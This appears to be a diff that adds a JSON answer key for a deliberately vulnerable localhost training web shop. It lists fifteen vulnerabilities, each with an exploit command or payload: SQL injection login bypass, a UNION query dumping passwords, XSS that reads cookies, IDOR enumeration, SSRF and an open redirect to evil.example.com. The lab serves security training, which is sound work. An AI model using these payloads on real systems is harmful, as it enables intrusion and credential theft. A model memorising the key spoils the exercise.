@@ -1,0 +1,142 @@
+{
+  "lab": "01-vulnshop",
+  "base_url": "http://127.0.0.1:18801",
+  "stack": "python-stdlib + sqlite3",
+  "vulns": [
+    {
+      "id": "V01",
+      "class": "scm",
+      "severity": "high",
+      "route": "/.git/config",
+      "desc": "Repositório .git exposto na raiz web (/.git/config e /.git/HEAD vazam remote origin, branch e identidade do deploy-bot).",
+      "exploit": "git-dumper http://127.0.0.1:18801/.git/ ./loot  ||  curl http://127.0.0.1:18801/.git/config",
+      "points": 1
+    },
+    {
+      "id": "V02",
+      "class": "creds",
+      "severity": "critical",
+      "route": "/.env",
+      "desc": "Arquivo .env (env-file) servido em texto plano com DB_PASSWORD, SECRET_KEY, STRIPE_KEY sk_live_..., JWT_SECRET.",
+      "exploit": "curl http://127.0.0.1:18801/.env  -> grep -E 'DB_PASSWORD|SECRET_KEY|sk_live_'",
+      "points": 1
+    },
+    {
+      "id": "V03",
+      "class": "backup",
+      "severity": "high",
+      "route": "/backup.sql",
+      "desc": "Dump SQL de backup exposto com INSERT INTO users contendo senhas em texto plano e hashes md5/bcrypt legados.",
+      "exploit": "curl http://127.0.0.1:18801/backup.sql  -> credenciais de todos os usuários",
+      "points": 1
+    },
+    {
+      "id": "V04",
+      "class": "dir-listing",
+      "severity": "medium",
+      "route": "/uploads/",
+      "desc": "Directory listing estilo Apache ('Index of /uploads') expondo invoice_1.pdf, db_dump.sql, users_export.csv.",
+      "exploit": "curl http://127.0.0.1:18801/uploads/  -> 'Index of /uploads' lista arquivos sensíveis",
+      "points": 1
+    },
+    {
+      "id": "V05",
+      "class": "headers",
+      "severity": "low",
+      "route": "/",
+      "desc": "Headers de segurança ausentes em todas as respostas: sem X-Frame-Options (clickjacking), Content-Security-Policy, X-Content-Type-Options nem Strict-Transport-Security.",
+      "exploit": "curl -I http://127.0.0.1:18801/  -> nenhum header de segurança presente (clickjacking via iframe possível)",
+      "points": 1
+    },
+    {
+      "id": "V06",
+      "class": "cookie",
+      "severity": "medium",
+      "route": "/login",
+      "desc": "Cookie de sessão setado sem flags HttpOnly, Secure ou SameSite (roubável via XSS / sniffável).",
+      "exploit": "Login com sucesso -> 'Set-Cookie: session=...; Path=/' sem HttpOnly/Secure/SameSite",
+      "points": 1
+    },
+    {
+      "id": "V07",
+      "class": "info-disc",
+      "severity": "medium",
+      "route": "/product?id=abc",
+      "desc": "Erro verboso / information disclosure: exceções não tratadas e erros SQL retornam traceback Python completo e a query crua no corpo da resposta.",
+      "exploit": "curl 'http://127.0.0.1:18801/product?id=1%27'  ou qualquer entrada inválida -> traceback/erro SQL no body",
+      "points": 1
+    },
+    {
+      "id": "V08",
+      "class": "admin-panel",
+      "severity": "high",
+      "route": "/admin",
+      "desc": "Painel admin acessível sem autenticação, lista todos os usuários (id, username, email, role).",
+      "exploit": "curl http://127.0.0.1:18801/admin  -> tabela de usuários sem login (também via breadcrumb /robots.txt -> /secret-admin)",
+      "points": 1
+    },
+    {
+      "id": "V09",
+      "class": "sqli",
+      "severity": "critical",
+      "route": "/login",
+      "desc": "SQL Injection com bypass de autenticação no POST /login (query montada por concatenação de string).",
+      "exploit": "curl -i -d \"username=' OR '1'='1' -- &password=x\" http://127.0.0.1:18801/login  -> 302 /dashboard + Set-Cookie",
+      "points": 1
+    },
+    {
+      "id": "V10",
+      "class": "sqli",
+      "severity": "high",
+      "route": "/product?id=1",
+      "desc": "SQL Injection boolean/error-based no GET /product?id= (concatenação direta do id). id=1 AND 1=2 retorna vazio; id=1' vaza erro sqlite verboso.",
+      "exploit": "curl 'http://127.0.0.1:18801/product?id=1%20AND%201=2' (vazio)  e  curl 'http://127.0.0.1:18801/product?id=1%27' (erro SQL). UNION: id=0 UNION SELECT 1,username,3,password FROM users",
+      "points": 1
+    },
+    {
+      "id": "V11",
+      "class": "xss",
+      "severity": "medium",
+      "route": "/search?q=",
+      "desc": "Reflected XSS no GET /search?q= (parâmetro refletido sem encoding no HTML).",
+      "exploit": "curl 'http://127.0.0.1:18801/search?q=<script>alert(1)</script>'  -> script refletido no body",
+      "points": 1
+    },
+    {
+      "id": "V12",
+      "class": "stored-xss",
+      "severity": "high",
+      "route": "/comment",
+      "desc": "Stored XSS: POST /comment armazena o body; GET /comments renderiza todos os comentários sem encoding.",
+      "exploit": "curl -d \"author=h4x&body=<script>alert(document.cookie)</script>\" http://127.0.0.1:18801/comment  ; depois GET /comments dispara o payload",
+      "points": 1
+    },
+    {
+      "id": "V13",
+      "class": "idor",
+      "severity": "high",
+      "route": "/api/order?id=1",
+      "desc": "IDOR: GET /api/order?id= (e /api/order/<id>) retorna QUALQUER pedido sem checagem de propriedade. IDs sequenciais 1..5 de usuários diferentes.",
+      "exploit": "for i in 1 2 3 4 5; do curl \"http://127.0.0.1:18801/api/order?id=$i\"; done  -> pedidos de outros usuários (user_id varia)",
+      "points": 1
+    },
+    {
+      "id": "V14",
+      "class": "open-redirect",
+      "severity": "low",
+      "route": "/redirect?url=",
+      "desc": "Open redirect: GET /redirect?url= emite 302 Location: <url> sem validação.",
+      "exploit": "curl -i 'http://127.0.0.1:18801/redirect?url=https://evil.example.com'  -> 302 Location: https://evil.example.com",
+      "points": 1
+    },
+    {
+      "id": "V15",
+      "class": "ssrf",
+      "severity": "high",
+      "route": "/fetch?url=",
+      "desc": "SSRF: GET /fetch?url= faz urlopen server-side e retorna o corpo. Permite alcançar recursos internos (apenas http/https permitidos).",
+      "exploit": "curl 'http://127.0.0.1:18801/fetch?url=http://127.0.0.1:18801/.env'  -> servidor busca e devolve conteúdo interno",
+      "points": 1
+    }
+  ]
+}
